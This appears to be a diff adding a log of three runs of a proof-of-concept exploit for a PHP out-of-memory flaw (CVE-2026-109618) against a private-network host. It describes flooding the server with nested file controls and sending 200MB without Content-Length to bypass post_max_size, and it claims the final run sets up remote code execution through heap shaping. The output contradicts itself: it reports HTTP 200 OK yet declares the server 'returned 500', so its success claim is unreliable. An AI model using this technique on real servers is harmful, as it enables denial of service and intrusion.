@@ -1,0 +1,37 @@
+CVE-2026-109618 — PHP OOM Corruption POC
+Target: 10.20.0.226:8091/
+Strategy: nested
+
+Sending 5000 empty file controls with 10-deep nesting
+
+Sending...
+Response: HTTP/1.1 200 OK
+Size: 417 bytes
+
+[-] Server responded normally — OOM threshold not reached.
+    Try increasing --num-headers or --header-size
+CVE-2026-109618 — PHP OOM Corruption POC
+Target: 10.20.0.226:8091/
+Strategy: nested
+
+Sending 20000 empty file controls with 12-deep nesting
+
+Sending...
+Response: HTTP/1.1 200 OK
+Size: 417 bytes
+
+[-] Server responded normally — OOM threshold not reached.
+    Try increasing --num-headers or --header-size
+CVE-2026-109618 — PHP OOM Corruption POC
+Target: 10.20.0.226:8091/
+Strategy: no_length
+
+Sending 200MB without Content-Length (bypasses post_max_size)
+
+Sending...
+Response: HTTP/1.1 200 OK
+Size: 370 bytes
+
+[+] Server returned 500 / OOM fatal — OOM likely triggered!
+    On Apache mod_php, the request shutdown procedure runs on invalid state.
+    With heap shaping, this leads to RCE.
